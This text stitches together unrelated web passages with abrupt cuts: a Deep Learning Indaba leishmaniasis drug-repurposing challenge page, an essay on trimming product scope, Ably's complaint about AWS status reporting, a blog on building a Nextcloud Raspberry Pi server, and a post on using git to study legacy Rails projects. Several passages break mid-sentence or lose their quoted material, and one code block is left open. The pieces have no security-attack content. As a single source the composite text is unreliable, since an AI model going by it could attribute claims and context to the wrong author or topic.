<p>In the recent years a massive drug discovery campaign has led to discovery of a new drug (codenamed GNF6702) and its analog (a new, improved version, named NITD689), which affect parasites ability to degrade unnecessary and damaged proteins. While these drugs seem to work against a wide range of pathogens (including these causing African sleeping sickness, Chagas disease and visceral leishmaniasis), they are not effective against the other leishmaniases. Additionally, there is an emerging mutation among the parasites, that already now renders the drug ineffective. Therefore, even though it is currently successful in the clinical trials, it will most likely not lead to the eradication of the disease.&nbsp;  </p>
<p>There is a dire need for a new, safe therapy for kinetoplastis, one that can be administered earlier, with lesser likelihood of bothersome side effects, one that could eradicate these diseases once and for all. Finding this therapy is the goal of this Indaba Grand Challenge, and literally lives are at stake. The approach to identify potential cure candidates is drug repurposing. </p>
<h2>What is Drug Repurposing?</h2>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg 910w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-300x198.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-768x508.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-85x56.jpg 85w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-234x155.jpg 234w" sizes="(max-width: 910px) 100vw, 910px"><figcaption>Photo Credit: pixabay.com</figcaption></figure>
<p>Drug repurposing is the act of researching if an existing drug can be used for new therapeutic purposes. It’s something that has been done for centuries. A large amount of medications on the market right now are used for multiple purposes: for instance, aspirin is a pain reliever and also a blood thinner, ibuprofen is also used for pain relief, and for reducing inflammations.</p>
<p>The high cost of research and development involved in finding new drugs means that most of these will be targeted to “First World” countries to generate returns.</p>
<p>For “neglected diseases” or “tropical diseases”, drug repurposing is used as a sort of universal strategy: it lowers the costs of research and production and the time needed for clinic trials, which is why you’ll find that many of these diseases use medication that was originally used for other illnesses.</p>
<h2>The Challenge </h2>
<p>Drug discovery methods and pipelines are well described and modular. Each can be decomposed into smaller pieces, which can be rearranged and modified. All of these pipelines rely heavily on knowledge representation, pattern detection and building of statistical models.</p>
<p>The goal of this Indaba Grand Challenge is to, through the use of standard techniques and publicly available data on drugs, drug targets and kinetoplastids (parasites causing amongst other leishmaniasis), identify either:</p>
<ul>
<li>Compounds among known, approved drugs which can target known drug targets in <em>Leishmania </em>(especially one of the 15 species known to cause the cutaneous type of disease)<em> </em>in addition to their official use.</li>
<li>Compounds among known, approved drugs with sufficiently similar targets in the goal organisms to the targets in kinetoplastids.</li>
</ul>
<p>Importantly, the verification of a drug-target interaction is possible and routinely done <em>in silico</em>. However, not all drug-target combinations can be verified, due to sheer combinatorial expansion and limited computational resources. In addition, the identification of similarities and analogies between known experimental data is far from trivial and, despite the existence of numerous approaches, cannot be solved by one statistical technique alone.</p>
<p>By launching this Grand Challenge, and true to the core values of Deep Learning Indaba, we aim to build a <strong>collaborative effort</strong>, joining experts and enthusiasts in machine learning and software engineering, with doctors, epidemiologists, medicinal chemists and policy experts, to create a <strong>synergistic effect at scale</strong>. Our vision, if it becomes true, is one where interesting discoveries of the community are taken up by the experts, and conclusions of the experts are fed back to the community to iteratively improve on its findings and make breakthroughs possible. <strong>No single person can do it perfectly, but through a joint effort, together we can. </strong></p>
<h2> Challenge Specs </h2>
<p><strong>Goal:</strong> Propose a new treatment, comprising an <em>Leishmania </em>protein (either from a defined species, or a protein present in the proteome of one or more of the <em>Leishmania </em>species) and a small molecule (or set of small molecules). Submission can be specified as:</p>
<ul>
<li>Small molecule (SMILES/SMARTS string or SDF file) and a protein name</li>
<li>PDB file with a structure of a target and a bound small molecule</li>
</ul>
<p><strong>Available resources: </strong>We have put together a list of available resources and additional material <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/resources/" target="_blank">here</a>.</p>

<h2>Who can apply?</h2>

<p>We invite you to join this initiative and help put an end to Leishmaniasis. We need your involvement, especially if, you are: </p>
<ul>
<li><strong>Data science</strong> or <strong>Machine Learning</strong> expert or enthusiast: we have the data, tools, benchmarks and everything you need to know to attack this problem. Our community needs your data wrangling skills. If you feel up for a challenge, apply here!</li>

The issue has to do with how new features and new products are defined. Regardless of the client’s experience building digital products, SaaS, mobile apps, web apps, the majority generally tend to screw this up. As a Product Design Consultant, I haven’t worked on one feature where I didn’t have to provide clarity to strip down and simplify the scope. The real issue is that the client tends to give little thought to the product scope (amount and complexity of features) for the first version and how it feeds into the second version, through user feedback and analytics data, and how that feeds into the third version. Whatever you think your Minimal Viable Product is, can be stripped much further down.</p><p>I have a few theories as to why clients make this mistake.&nbsp;</p><ul data-rte-list="default"><li><p>They’re too passionate and excited about the new feature or product, so there is a lot of attachment to the final product vision, which makes for emotional decision making</p></li><li><p>They have a really grand vision and they *think they’ve stripped down the scope to the core, when they haven’t</p></li><li><p>They think they have to build everything because of a bureaucratic reason</p></li><li><p>They think the user won’t like the feature or product, because the real value is in the combination of all of those features being in one place</p></li></ul><p>This mistake is important because building too much, too fast, will create a larger time frame between their starting point and their point of receiving positive feedback from users (qualitative feedback, product market fit, user analytics data or some KPI). This larger gap will lead to them running out of resources faster, whether it’s funding, or psychological motivation to continue.</p><p>I will use a couple of examples based on real clients I’ve worked with to explain my theory and how to go about the thinking.&nbsp;</p><p>1- The client was building a SaaS analytics dashboard for an enterprise use case. As with any data visualization dashboard, giving the user the ability to see an overview snapshot of data to answer their underlying business question is the primary goal, and the secondary goal is for them to dig deeper into specific data points to further uncover information that will guide their business decisions. The first step is to build the primary overview dashboard with the snapshot 30,000 ft view of the data and optimize that in the first version, then focusing on iterations. The second step is to build the deep dive views. If there is no interaction with the overview of the data because it’s deemed not interesting enough, because it’s answering the wrong business questions that the user doesn’t actually care about, then the deep dive views don’t matter, the user won’t try to dive deep into something irrelevant. The way to measure the interaction with the snapshot view of the data without having built the deep dive views was to allow click actions into that overview data, but just provide static deep dives, rather than fancy interactive deep dives that lead to more deep dives. In short, the secondary view, which in this case was the analytics deep dives, had to be stripped down a lot.</p><p>2- The client was building a social application. “We need the ability for users to comment, and for other users to respond to these comments via text, voice, and video.” If the initial user doesn’t comment, the corresponding feature of text, voice and video is utterly useless and literally unusable in the UI. So we built the initial comments section, measured the interaction using an analytics tool, or sometimes manually tracked what percentage of users left the initial comment. The idea was that if that percentage is high enough, we would continue with the rest of the product hypothesis, if it’s low, rethink the initial comment.</p><p>In short, design the core, core-core, like the actual core. Then strip it down further, and build it. And measure it, optimize it. And once it reaches a certain level, then you can start to build the rest, otherwise “the rest” will never be used, and won’t be given a fair chance to be measured.</p></div></div></div></div></div></div></div>]]>

<p><strong><em>TL;DR: Don’t trust AWS status reports, they’re misleading</em></strong></p>
<p>This morning at 1:00am the reporting systems for <a href="https://ww.ably.io/platform" rel="noopener">our Ably realtime platform</a> notified us of a whole range of service failures for one of our customers in a dedicated realtime cluster in AWS’ Northern California datacenter (us-west-1).</p>
<p>We investigated and discovered network partitioning along with other severe network failures. We checked the AWS status dashboard for information — nothing, all green. 30 minutes later AWS finally posted a status update with this:</p>

<ul>
<li>
<strong>Amazon AWS flat out lies</strong> — considering a cloud based network accessible service to be “operating normally” when the network is not working is insane</li>
<li>
<strong>We cannot trust Amazon AWS status updates </strong>because the information provided to us about the severity of the issue or how quickly it will really be resolved</li>
</ul>
<p>We suspect if we had reached out to AWS in this post-truth world, this is what we would have got:</p>

<p>Fortunately that’s pretty simple — what we require is honesty and we expect AWS to err on the side of caution.</p>
<p>Here’s what we did at <a href="https://www.ably.io/" rel="noopener">Ably</a> for our customers to notify them about what happened when we detected the fault:</p>
<ul>
<li>We had monitoring systems to tell us immediately there was a fault, which in turn created an incident automatically in <a href="https://status.ably.io/" rel="noopener">our status site</a> within minutes of the problems in us-west-1.</li>
<li>We then manually <a href="https://status.ably.io/incidents/377" rel="noopener">updated the incident on our status site</a> with our commentary and emailed everyone signed up for status updates with the issue and what we were doing about it (which was to route traffic away from the faulty datacenter).</li>
<li>We took an honest approach and weren’t worried to show a bit of orange on our status site. Because if something is not operating as expected, then we are pretty sure that is not classified as “operating normally” and at best should be classified as “performance issues”. See our status dashboard below:</li>

<p>Our plea to Amazon AWS is please don’t fall into this post-truth trap and aim to have false green in your status dashboard. Looking at your AWS status dashboard today, in spite of the fact that an entire datacenter was unusable for a few hours this morning, is completely green.

<p>We rely on AWS infrastructure to deliver our realtime data delivery platform. Amazon needs to take their downtime and issues more seriously, be more upfront about what’s going on, and not wait half an hour to report that a datacenter being offline is “operating normally”. It’s not like they don’t have resources that outstrip any other infrastructure provider, <a href="https://www.google.co.uk/search?%7Bgoogle:acceptedSuggestion%7Doq=amazon+hires+100%2C000+in+a+month&amp;sourceid=chrome&amp;ie=UTF-8&amp;q=amazon+hires+100%2C000+in+a+month&amp;gws_rd=ssl" rel="noopener">they’re hiring 100k employees in the next 18 months</a>.</p>
<p>Amazon AWS, we expect more of you. Please be honest.</p>

    <h3 id="why-am-i-doing-this-to-myself">Why am I doing this to myself?</h3>
<p>I really like taking notes. Notes are an extension of my stupid brain, which can’t remember a <em>damn</em> thing on its own. All these notes were being stored on Google’s servers, which <a href="https://en.wikipedia.org/wiki/PRISM_%28surveillance_program%29" target="_blank" rel="noreferrer noopener">didn’t</a> <a href="https://www.gnu.org/proprietary/malware-google.en.html" target="_blank" rel="noreferrer noopener">seem like</a> <a href="https://www.washingtonpost.com/technology/2019/06/21/google-chrome-has-become-surveillance-software-its-time-switch/" target="_blank" rel="noreferrer noopener">the best</a> <a href="https://www.eff.org/deeplinks/2020/03/google-says-it-doesnt-sell-your-data-heres-how-company-shares-monetizes-and" target="_blank" rel="noreferrer noopener">idea</a>. And it wasn’t just notes. Pictures, videos, miscellaneous files, I was giving it all to Google for free.</p>
<p>Since my notes contain <em>my bad ideas, and they are <strong>my</strong> bad ideas alone</em>, I wanted to take back control of my data. After researching ways to do such a thing (through the Google search engine of course), my best option seemed to be a <a href="https://nextcloud.com/" target="_blank" rel="noreferrer noopener">Nextcloud server</a>.</p>
<p>Nextcloud has all the niceties of a Google Drive or Dropbox, but you host it yourself on your own hardware, and no one’s allowed to snoop. This sounded great! This’ll be so easy! I’ll get this running in just a couple minutes!</p>
<p>Maybe you guessed it from the length of this article, but… this was not the case. Building and setting up this server was a nightmare hellhole, and I’m here today to share my hell with you, the reader, for free!</p>
<p>This isn’t so much a guide or tutorial - more just me explaining (and venting about) the massive effort it took to set this damn thing up. I hope somebody someday learns something from my suffering, or is maybe just entertained.</p>
<h3 id="the-hardware">The hardware</h3>
<p>I had been interested in doing <em>something, anything at all</em>, with a <a href="https://www.raspberrypi.org/" target="_blank" rel="noreferrer noopener">Raspberry Pi</a> for a while, so this was my excuse. Beyond that, I just followed <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-nas" target="_blank" rel="noreferrer noopener">this great article from a Pi magazine</a> for my hardware choices. If you’re wondering what hardware I used, look there. I copied it exactly. Plus, c’mon, look how cute everything looks stacked up like that! A literal “stack”! Ha!</p>
<p><img src="https://acolannino.io/blog/how-i-struggled-to-build-a-nextcloud-server-and-won/nextbox.png" alt="nextbox"></p>
<p>One part the guide doesn’t explain very well was the “USB powered hub” - both why you need one, and what that actually is. Is it a hub powered by USB? A USB powered by a “hub”? What is a “hub”? Maybe it seems obvious to you, and maybe I was just sleep deprived at the time, but I was having trouble wrapping my smooth brain around this concept.</p>
<p>Turns out, the USB hub is simply needed to provide power to the two hard drives, rather than the power going to the Pi <em>and</em> the drives. I have no idea if this was really necessary, but it makes me feel 10% more confident my drives won’t crap out at any moment, and that helps me go to sleep at night.</p>
<h3 id="raid-1-or-whatever-that-means">RAID 1, or whatever that means</h3>
<p>Here I was, all ready to go in fulfilling my long-held dream of running my own little server. Then my stupid coworker comes in, and asks “hey, what if your drive fails? what will you do then?” and ruins all of my fun.</p>
<p>He tells me I should do “RAID”, which is apparently all the rage. RAID stands for “Redundant, Awesome… I dunno”, and was invented on a whim by <a href="https://en.wikipedia.org/wiki/RAID#History" target="_blank" rel="noreferrer noopener">some random nerds in the 80’s</a>. To attempt to give an actual explanation: Using a RAID 1 setup means you get data redundancy, as it will constantly mirror the drives. If one drive craps out, the other drive will still have all the same data, so you just replace the broken one and go about your day as normal. The downside of RAID 1 is you’re getting half the storage capacity that you paid for, but I figured 1 terabyte was large enough to store plenty of memes.</p>
<p>Setting up the RAID array was by far the most pain-free part of the process. Actually, it was the <em>only</em> pain-free part, the rest was pure suffering. I recommend doing this for fun if you’re bored on a Friday evening. It’s cathartic, and the only part of this whole thing that <a href="https://www.youtube.com/watch?v=nVqcxarP9J4" target="_blank" rel="noreferrer noopener">just worked</a>.</p>
<p>All I had to do was run some cute little commands from the guide, and I was golden. I didn’t fully understand the intricacies of everything I was doing, and the command-line interfaces for some of these programs were absolutely wild (press ‘n’ for a new partition, and ‘p’ for a “primary partition”? Really <code>fdisk</code>? Does this make you happy?), but other than that, it was all smooth sailing.</p>
<p>I should note - no one on the internet really cared to explain how a RAID setup should work with Nextcloud. Eventually I figured this out - the RAID array is seen by the OS as one device, so just politely ask Nextcloud to use that instead of the SD card. I ended up having to <a href="https://docs.nextcloud.com/server/latest/admin_manual/issues/general_troubleshooting.html#troubleshooting-data-directory" target="_blank" rel="noreferrer noopener">create a symlink from Nextcloud’s data directory to a directory on my RAID device</a>, but this wasn’t the worst thing I had to suffer through.</p>
<h3 id="big-pixel-energy-destroys-my-wifi">Big Pixel Energy destroys my WiFi</h3>
<p>So here I am, all proud and happy of my brand new Raspberry Pi running a fresh <del>Raspbian</del> Raspberry Pi OS. As I was setting up the RAID array, downloading lots of cute <a href="https://en.wikipedia.org/wiki/Unix_philosophy" target="_blank" rel="noreferrer noopener">UNIX-style utilities</a>, the WiFi starts to cut in-and-out. This has been a problem on my other main machines ever since I switched them to Linux, so I figured it was the <em>mysterious Intel WiFi+bluetooth death bug</em> plaguing me on yet another machine.</p>
<p>I did some more digging, and found what I believe to be the truth (or, as close as <em>I’ll</em> ever get to the truth). There appears to be a <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=247982" target="_blank" rel="noreferrer noopener">widely reported problem with the Pi 4</a> where the signals coming out from the HDMI (which are shaped like squares?) are the same frequency(?) as the WiFi. So, if your display resolution is pumped up high enough, and that HDMI is cranking out lots of square signals, <a href="https://www.raspberrypi.org/forums/viewtopic.php?p=1514642&amp;sid=b811be4b798c7ab50d7626c691b5cc26#p1514642" target="_blank" rel="noreferrer noopener">the WiFi gets totally borked</a>. Neat.</p>
<p>This is clearly absurd, and I hate it. Hardware is bad, and everyone saying “programmers gotta learn hardware too!!!” should get off my lawn. At first I started following the internet’s advice to simply “lower your screen resolution so the WiFi goes fast”, but this became tiring on the eyes (especially with the added problem of <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=250534" target="_blank" rel="noreferrer noopener">not being able to use redshift on the Pi</a>).</p>
<p>Even though I was reluctant to at first, eventually I started controlling my Pi via an SSH terminal from another machine to avoid this problem entirely. Boy oh boy, was this a joyful discovery. Not only was I freed from whatever stupid resolution the WiFi demanded, but I could also use my beloved blue-light filter to prevent my retinas from burning up. Sure, I had no GUI, but learning to do everything through the terminal came easily enough, and once I got there, I felt like some kind of computer wiz-kid.</p>
<h3 id="the-installation">The installation</h3>
<p>After the RAID was set up and I got SSH going, it was time to install Nextcloud. This proved to be shockingly difficult. There can’t just be a little <code>sudo apt install nextcloud</code> action, no no no no no. You need to install each little bit yourself, by hand, and glue every piece together (<code>nextcloud</code> isn’t even in the apt repository, of course you have to download / unpack something called a “tarball” yourself).</p>
<h4 id="attempt-1-snap">Attempt 1: Snap!</h4>
<p><a href="https://snapcraft.io/" target="_blank" rel="noreferrer noopener">Snap</a> is Canonical’s (maker of Ubuntu) locked-down little sandbox for Linux apps. The word “container” is thrown around when describing it, and I have no idea if that’s correct, but I sure as heck wouldn’t recommend the <a href="https://snapcraft.io/nextcloud" target="_blank" rel="noreferrer noopener">official Nextcloud snap</a>.</p>
<p>The major selling point of snap is that it bundles together an application’s dependencies, so it will <em>just work</em> on any Linux distribution. This sounds great! Sign me up! I’m lazy and hate installing my own dependencies! Who the heck wants to do that? Shell scripts, that’s who.</p>
<p>Problem is, this doesn’t <em>really</em> work on every distro, and in fact, it doesn’t work on the latest Raspberry Pi OS. Do I know why? No. The Nextcloud snap <a href="https://en.wikipedia.org/wiki/Fail-silent_system" target="_blank" rel="noreferrer noopener">failed silently</a> before starting up, and it was too shy to tell me why. Cool.</p>
<h4 id="attempt-2-some-shell-scripts-i-found">Attempt 2: Some shell scripts I found</h4>
<p>At this stage, I was still committed to being a lazy jerk. There’s no way in heck I would manually install <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html#prerequisites-for-manual-installation" target="_blank" rel="noreferrer noopener">30-something php modules</a> by hand. So, I found a <a href="https://ownyourbits.com/nextcloudpi/" target="_blank" rel="noreferrer noopener">flashy looking site that claimed to have the scripts for me</a>. It didn’t work. The script took multiple runs to actually complete itself, and after the 5th or so attempt, it seemed happy. I went to the web GUI, told it to “initialize”, and it kinda hung out there for a while. I went to take a walk, and when I came back and it was still pretending to initialize.</p>
<p>I found another <a href="https://github.com/nextcloud/vm" target="_blank" rel="noreferrer noopener">official-sounding shell script</a>, in a last-ditch attempt at being lazy. At least this script had the courage to fail immediately, as it’s <a href="https://github.com/nextcloud/vm/blob/master/nextcloud_install_production.sh/#L83" target="_blank" rel="noreferrer noopener">hardcoded to only work specifically on Ubuntu 20.04</a>. Would have been real nice if it had told me that up-front, but hey, I’m not the one going through the trouble of writing all these (failing) shell scripts.</p>
<h4 id="attempt-3-the-hard-way">Attempt 3: The hard way</h4>
<p>Being lazy clearly wasn’t going so well. By now several days had passed, and all I had to show for myself was a whole terabyte of nothing. Worse yet, the shell scripts I ran had spread their little tentacles all over my pure OS install, so I knew I’d have trouble in the future if I left all that cruft in-place. I decided to re-image my OS, and that I would repeat the RAID setup once I got Nextcloud going.</p>
<p>As previously mentioned, the <a href="https://docs.nextcloud.com/server/latest/admin_manual/installation/source_installation.html" target="_blank" rel="noreferrer noopener">recommended installation</a> wants you to install and hook each bit up together yourself. This approach made some sense as I learned (sort of, vaguely) more about how Nextcloud works - It’s running on a webserver directly on your machine, handling all the networking and whatnot, with a full-on SQL database and lots of PHP magic happening too. So, it’s understandable that Nextcloud has to spread it’s mischievous claws in each and every crevice of your OS.</p>
<p>I followed the <a href="https://docs.nextcloud.com/server/latest/admin_manual/index.html" target="_blank" rel="noreferrer noopener">Nextcloud documentation</a>, which sure does exist. In their defense, all of their software is <a href="https://en.wikipedia.org/wiki/Free_and_open-source_software" target="_blank" rel="noreferrer noopener">free and open</a>, including the docs, so I could have submitted any number of changes, and yet here I am selfishly writing this blog. The worst part of this process was the aforementioned php modules, which had to be installed one-by-one, and had mismatched names compared to the Debian repository. I had these all installed after about an hour, and I remember listening to a podcast in the background while suffering through it.</p>
<p>After <code>apt install</code>ing every module (seriously, why doesn’t php have it’s own package manager?!), then gliding through the initialization of Nextcloud with <code>occ</code>, my server was working. The <em>Nextcloud Hub</em> web interface greeted me with the most pleasant design and animations I had seen in quite some time. <strong>It was over. I had won.</strong></p>
<h3 id="conclusion">Conclusion</h3>
<p>All in all, I sure did have a time. The admin page still won’t stop whining about a …</p></div></div>

<h4>To keep track of how a project has been changing through time is key to provide a big picture of what things have been changing and why. After all, the business logic or the domain required those changes to be recorded. Read this to know why it is important to keep an eye on a project’s history.</h4>

<h2>Become a Git Historian</h2>
<p>This is chapter 2 of a series of blog posts about some pieces of advice, tools, and tips you can consider when you arrive at a Rails project considered as Legacy.</p>
<p>In the <a href="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html">previous chapter</a>, we reviewed our project’s anatomy.</p>
<p>In this chapter, we are using <a href="https://git-scm.com/">Git</a> and other tools related to it to find out more about our Rails Legacy System. But this time, it’s our project’s history turn.</p>
<p>First, I want us to understand ‘<strong>history</strong>‘ as:</p>
<blockquote><p>
  “The whole series of past events connected with someone or something”.
</p></blockquote>
<p>When speaking about history in a Rails project, it’s really important to check <em>how</em> our project has changed through time to get an idea of why things have been modified. Some of those adjustments were maybe done based on business logic, or maybe the domain required those changes.</p>
<p>Maybe, other changes happened because someone followed a particular path —which is a normal thing if you consider that every project is different and that there are infinite factors that can affect it in a positive or in a negative way.</p>
<span><span><a href="https://twitter.com/intent/tweet?url&amp;text=In%20Software%20Development%2C%20a%20legacy%20system%20is%20outdated%20computing%20software%20that%20is%20still%20in%20use.&amp;via=weareMagmaLabs&amp;related=weareMagmaLabs" target="_blank" rel="noopener noreferrer">In Software Development, a legacy system is outdated computing software that is still in use. </a></span><a href="https://twitter.com/intent/tweet?url&amp;text=In%20Software%20Development%2C%20a%20legacy%20system%20is%20outdated%20computing%20software%20that%20is%20still%20in%20use.&amp;via=weareMagmaLabs&amp;related=weareMagmaLabs" target="_blank" rel="noopener noreferrer">Click To Tweet</a></span>
<p>In Software Development, a legacy system is outdated computing software that is still in use. That system still meets the needs it was originally designed for but doesn’t allow growth. What a legacy system does now for the project is all it will ever do. A legacy system’s older technology won’t allow it to interact with newer systems.</p>
<h2>Git extras</h2>
<p>To get a general summary of things about the project, like repo age, the number of commits, and who the people involved are we could use <a href="https://github.com/tj/git-extras"><code>git-extras</code></a>.</p>

<p><a href="https://github.com/tj/git-extras"><code>git-extras</code></a> has many interesting features that you can explore and use to get a better understanding of your project.</p>
<h3>Git log</h3>
<p>Ok, now let’s understand how <em>change</em> on single objects works with <code>git log</code>.</p>
<pre><code>$ git log --patch --stat Gemfile

<p>As you can see, it will show why a specific update was made. Or, maybe it will just trigger more questions. But, at least you will be closer to your main goal, which is “understand what was the purpose of those changes”.</p>
<h3>Git History</h3>
<p>Also, if you prefer the fancy way and see the timeline of a particular file, you can try <code>git-history</code>.</p>
<p>Now, let’s use <a href="https://github.com/pomber/git-history">git-history</a>, which is like a visual time machine where you can visually review any change on a specific file and understand its timeline.</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg"><img data-attachment-id="5429" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/git_history_-_admin_html_slim" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=2084%2C1350" data-orig-size="2084,1350" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Git_History_-_admin_html_slim" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=300%2C194" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?fit=1024%2C663" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1027%2C665" alt="" width="1027" height="665" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=300%2C194 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=200%2C130 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=768%2C498 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1024%2C663 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=1200%2C777 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=860%2C557 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=680%2C440 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=400%2C259 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?resize=50%2C32 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/Git_History_-_admin_html_slim.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>

<h3>Look for Documentation (we’re using Git as well)</h3>
<p>As we look for documentation keep in mind and ask yourself the following:</p>
<ul>
<li>Is there any documentation at all?</li>
<li>Is there good commentary on the code?</li>
<li>Do the names of things make sense?</li>
<li>Are the System Use Cases documented?</li>
<li>Is there someone in the team that understands the system?</li>
</ul>
<p>We can use <code>git whatchange doc</code> to see logs and differences in our documentation, check the example above:</p>
<pre><code>$ git whatchanged doc
commit e43e0fecfb5914ec0e72eadff73e90c0e14c7026
Author: Daniel Contreras &lt;daniel.country.club@magmalabs.io&gt;
Date:   Thu Jan 28 19:32:35 2016 -0500

:100644 100644 13fa6c9d4 ff7935d08 R055 doc/client-system/README.md     doc/client-system/README.adoc
</code></pre>
<p>It seems that we have a doc folder. 🎉🎉🎉 It also seems like the last time a document was modified was in 2016, so it’s time to start documenting your new progress. That would help you in the future, and any other developer that joins the team.</p>
<h3>Extra: The README</h3>
<p>There is a README?  Well, yes. But it is so poor…</p>
<p><a href="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg"><img data-attachment-id="5432" data-permalink="http://blog.magmalabs.io/2020/04/24/approaching-rails-legacy-systems-chapter-1-project-anatomy.html/readme_template" data-orig-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=2032%2C490" data-orig-size="2032,490" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="README_Template" data-image-description="" data-medium-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=300%2C72" data-large-file="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?fit=1024%2C247" src="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1424%2C343" alt="" width="1424" height="343" srcset="https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=300%2C72 300w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=200%2C48 200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=768%2C185 768w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1024%2C247 1024w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=1200%2C289 1200w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=860%2C207 860w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=680%2C164 680w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=400%2C96 400w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?resize=50%2C12 50w, https://i1.wp.com/blog.magmalabs.io/wp-content/uploads/2019/05/README_Template.jpg?w=2000 2000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a></p>
<p>Hey, but don’t worry, there are many templates you can use; like this <a href="https://github.com/dbader/readme-template" rel="noopener" target="_blank">example</a>.</p>
<h2>Wrap up</h2>
<p>Here are more things to keep in mind:</p>
<ul>
<li>Document everything you learn.</li>
<li>Keep documentation close to the code, simple is better.</li>
<li>You must understand the design/architecture.</li>
<li>Once you understand something, refine its documentation.</li>
</ul>
<p>I hope you find this blogpost compelling. In the following chapter, we are going to cover some nice toolings for static analysis of your code.</p>

                <div>
